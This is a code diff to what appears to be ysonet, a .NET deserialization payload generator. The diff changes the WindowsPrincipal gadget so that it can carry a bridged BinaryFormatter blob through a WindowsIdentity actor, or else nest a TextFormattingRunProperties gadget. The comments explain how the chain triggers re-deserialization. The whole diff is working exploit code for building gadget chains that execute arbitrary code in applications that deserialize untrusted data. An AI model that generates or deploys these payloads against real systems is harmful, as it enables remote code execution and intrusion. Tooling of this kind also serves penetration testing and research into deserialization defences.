@@ -49,21 +49,40 @@ namespace ysonet.Generators
             return new List<string> { GadgetTags.Bridged };
         }
 
+        public override string SupportedBridgedFormatter()
+        {
+            return Formatters.BinaryFormatter;
+        }
+
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            WindowsIdentity currentWI = WindowsIdentity.GetCurrent();
-            currentWI.Actor = new ClaimsIdentity();
-            //id.Actor.BootstrapContext = TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs);
-            currentWI.Actor.BootstrapContext = TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs);
+            // The WindowsIdentity placed in WindowsPrincipal.m_identity carries the gadget.
+            // With a bridge, its actor is the bridged BinaryFormatter blob, fired through the
+            // same actor base64-BF path WindowsIdentity uses (a plain bootstrapContext string
+            // is NOT re-deserialized, so the bridge must go through the actor key). Without a
+            // bridge, it is a live WindowsIdentity whose Actor.BootstrapContext holds TFRP.
+            object innerIdentity;
+            if (BridgedPayload != null)
+            {
+                innerIdentity = new WindowsIdentityIdentityMarshal(Convert.ToBase64String((byte[])BridgedPayload));
+            }
+            else
+            {
+                WindowsIdentity currentWI = WindowsIdentity.GetCurrent();
+                currentWI.Actor = new ClaimsIdentity();
+                //currentWI.Actor.BootstrapContext = TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs);
+                currentWI.Actor.BootstrapContext = TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs);
+                innerIdentity = currentWI;
+            }
 
-            byte[] gadget = (byte[])SerializeWithNoTest(currentWI, "binaryformatter", inputArgs);
+            byte[] gadget = (byte[])SerializeWithNoTest(innerIdentity, "binaryformatter", inputArgs);
             string b64encoded = Convert.ToBase64String(gadget);
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
             {
                 WindowsPrincipalMarshal obj = new WindowsPrincipalMarshal();
-                obj.wi = currentWI;
+                obj.Identity = innerIdentity;
                 return Serialize(obj, formatter, inputArgs);
             }
             else if (formatter.ToLower().Equals("json.net"))
@@ -249,11 +268,13 @@ namespace ysonet.Generators
     public class WindowsPrincipalMarshal : ISerializable
     {
         public WindowsPrincipalMarshal() { }
-        public WindowsIdentity wi { get; set; }
+        // A live WindowsIdentity (default) or a WindowsIdentityIdentityMarshal (bridge); both
+        // serialize m_identity as a WindowsIdentity that fires the inner gadget.
+        public object Identity { get; set; }
         public void GetObjectData(SerializationInfo info, StreamingContext context)
         {
             info.SetType(typeof(WindowsPrincipal));
-            info.AddValue("m_identity", wi);
+            info.AddValue("m_identity", Identity);
         }
     }
 
